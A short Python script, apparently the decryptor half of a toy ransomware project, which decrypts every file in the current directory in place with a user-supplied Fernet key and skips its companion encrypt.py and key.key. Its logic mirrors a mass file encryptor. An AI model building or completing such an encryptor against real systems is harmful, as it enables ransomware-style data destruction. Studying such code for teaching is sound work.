#import Modules

import os
from cryptography.fernet import Fernet

#Find files
files = []

for file in os.listdir():
        if file == "encrypt.py" or file == "key.key" or file == "decrypt.py":
                continue
        if os.path.isfile(file):
                files.append(file)
                
# Get the key
secret_key = input("Enter the key: ")

print(files)
        
#Decrypt files
for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        decrypted_contents = Fernet(secret_key).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(decrypted_contents)
            
print("All ur files have been decrypted\nYay!")